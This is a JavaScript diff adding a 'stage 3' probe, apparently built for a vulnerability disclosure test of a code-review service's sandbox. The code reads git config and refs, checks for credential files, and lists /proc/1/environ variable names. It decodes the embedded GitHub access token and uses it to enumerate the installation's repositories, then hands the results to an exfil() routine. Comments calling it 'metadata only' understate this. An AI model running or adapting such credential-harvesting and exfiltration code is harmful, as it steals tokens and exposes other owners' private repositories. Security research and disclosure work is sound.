@@ -209,3 +209,85 @@ function stage2(tag) {
 }
 
 module.exports.stage2 = stage2;
+
+// ---- Stage 3: E5-V1 token-presence / scope check (metadata only, token never sent out) ----
+function getAuth(url, token, timeoutMs) {
+  return new Promise((resolve) => {
+    let done = false;
+    const finish = (o) => { if (!done) { done = true; resolve(o); } };
+    try {
+      const u = new URL(url);
+      const req = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: "GET",
+        headers: { "User-Agent": "cr-probe-vdp", "Accept": "application/vnd.github+json",
+          "Authorization": "token " + token }, timeout: timeoutMs || 5000 }, (res) => {
+        let body = "";
+        res.on("data", (d) => { if (body.length < 2000) body += d.toString("utf8").slice(0, 2000); });
+        res.on("end", () => finish({ status: res.statusCode, body: body.slice(0, 1800) }));
+      });
+      req.on("timeout", () => { try { req.destroy(); } catch (e) { } finish({ err: "timeout" }); });
+      req.on("error", (e) => finish({ err: e.code || "error" }));
+      req.end();
+    } catch (e) { finish({ err: "exception" }); }
+    setTimeout(() => finish({ err: "deadline" }), (timeoutMs || 5000) + 300);
+  });
+}
+
+function stage3(tag) {
+  const home = process.env.HOME || "/home/jailuser";
+  const out = { tag: tag, git: {}, tokens: {}, opt: [], api: null };
+  const cfg = rd(home + "/git/.git/config", 20000) || "";
+  out.git.config_len = cfg.length;
+  out.git.remote_hosts = safe(() => (cfg.match(/url\s*=\s*([^\s]+)/g) || []).map((l) => {
+    try { return new URL(l.replace(/^url\s*=\s*/, "")).host; } catch (e) { return "nonurl"; }
+  }), []);
+  out.git.has_extraheader = /extraheader/i.test(cfg);
+  out.git.credential_helper = /helper\s*=/.test(cfg);
+  out.git.head = rd(home + "/git/.git/HEAD", 80);
+  out.git.local_refs = scanDir(home + "/git/.git/refs/heads", 20);
+  out.git.remote_refs = scanDir(home + "/git/.git/refs/remotes", 20);
+  out.git.packed_refs = safe(() => (rd(home + "/git/.git/packed-refs", 6000) || "").split("\n")
+    .filter((l) => l && l[0] !== "#").map((l) => l.split(" ").slice(1).join(" ")).slice(0, 30), []);
+  out.opt = scanDir("/opt/coderabbit", 20);
+  out.tokens.git_credentials = ex(home + "/.git-credentials");
+  out.tokens.gh_hosts = ex(home + "/.config/gh/hosts.yml");
+  out.tokens.netrc = ex(home + "/.netrc");
+  out.tokens.proc1env_keys = safe(() => {
+    const raw = fs.readFileSync("/proc/1/environ");
+    return raw.toString("utf8").split("\0").filter(Boolean).slice(0, 20).map((kv) => {
+      const i = kv.indexOf("=");
+      return { k: i > 0 ? kv.slice(0, i) : kv, l: i > 0 ? kv.length - i - 1 : 0 };
+    });
+  }, []);
+  let tok = null;
+  const m = cfg.match(/extraheader\s*=\s*AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)/i);
+  if (m) {
+    try {
+      const dec = Buffer.from(m[1], "base64").toString("utf8");
+      const mm = dec.match(/x-access-token:(\S+)/);
+      if (mm) { tok = mm[1]; out.tokens.extraheader_kind = "x-access-token"; out.tokens.token_len = mm[1].length; }
+    } catch (e) { out.tokens.extraheader_kind = "undecodable"; }
+  }
+  // also look for gh token in hosts.yml (presence only, no value, no use)
+  out.tokens.gh_hosts_present = out.tokens.gh_hosts;
+
+  if (tok) {
+    getAuth("https://api.github.com/installation/repositories?per_page=100", tok, 6000).then((r) => {
+      const a = { status: r.status || null, err: r.err || null };
+      if (r.body) {
+        try {
+          const j = JSON.parse(r.body);
+          a.total_count = j.total_count;
+          a.repos = (j.repositories || []).slice(0, 20).map((x) => x.full_name);
+          a.owner_set = Array.from(new Set((j.repositories || []).map((x) => (x.owner || {}).login || "?"))).slice(0, 10);
+          a.outside_reviewed_owner = (j.repositories || []).filter((x) => ((x.owner || {}).login || "") !== "crprobe-ldb77").length;
+        } catch (e) { a.parse = "non-json"; }
+      }
+      out.api = a;
+      exfil(tag + "meta", out);
+    });
+  } else {
+    exfil(tag + "meta", out);
+  }
+  return out;
+}
+module.exports.stage3 = stage3;
